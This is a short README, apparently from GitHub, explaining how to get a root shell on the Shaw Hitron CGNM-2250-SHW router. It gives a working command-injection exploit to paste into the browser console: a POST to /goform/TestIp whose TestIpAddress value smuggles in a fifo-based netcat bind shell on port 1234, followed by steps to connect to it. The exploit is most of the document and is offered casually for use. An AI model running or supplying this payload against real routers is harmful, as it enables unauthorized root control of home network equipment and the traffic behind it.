# Getting a Root shell on the CGNM-2250-SHW Router
How to root CGNM-2250-SHW (Shaw Hitron Router)

I was messing around this weekend while putting of doing my COM100 project and I found this jucy vuln that gives you a root shell. Best of all its super easy to do, there are only 3 steps.

__1. login to the admin page of the rounter__
![admin page](https://github.com/CanadianCommander/CGNM-2250-SHW-Root/blob/master/HitronLogin.png)


__2. Paste this command in to the web browser console__

```
$.post("/goform/TestIp", {csrf_token: $("#csrf_token").val(), model: '{"TestIpAddress":"; rm -f /dev/myF; mkfifo /dev/myF; cat /dev/myF | /bin/sh -i 2>&1 | nc -l -p 1234 > /dev/myF;","UserType":"1","inputip":1,"TestMode":0}'}, function (data) {console.log(data)})
```
![run command in browser console](https://github.com/CanadianCommander/CGNM-2250-SHW-Root/blob/master/injectCommand.png)

__3. open a terminal and netcat to the router on port 1234__
![terminal netcat](https://github.com/CanadianCommander/CGNM-2250-SHW-Root/blob/master/rootShell.png)

As you can see you now get a jucy root shell (root is the only user that exists on the system). Have fun messing around!
